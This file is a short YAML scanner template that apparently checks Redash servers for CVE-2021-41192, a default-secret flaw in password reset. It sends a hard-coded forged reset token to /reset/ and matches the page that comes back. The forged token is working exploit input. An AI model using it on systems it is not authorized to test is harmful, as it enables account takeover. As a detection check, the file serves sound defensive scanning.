name: poc-yaml-redash-cve-2021-41192-unauth
binding: 0b96d6b9-b382-4294-a2eb-f444277de81a
manual: true
detail:
    author: z92g(https://github.com/z92g)
    links:
        - https://ian.sh/redash
    vulnerability:
        id: CT-199718
        level: medium
transport: http
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /reset/IjEi.YhAmmQ.cdQp7CnnVq02aQ05y8tSBddl-qs
        expression: |-
            response.status == 200 && response.headers["Referrer-Policy"].contains("strict-origin-when-cross-origin") && response.body.bcontains(bytes("Enter your new password:")) && response.body.bcontains(bytes("Change my password")) && '<img src="/static/images/redash_icon_small.png">'.bmatches(response.body)
expression: r0()
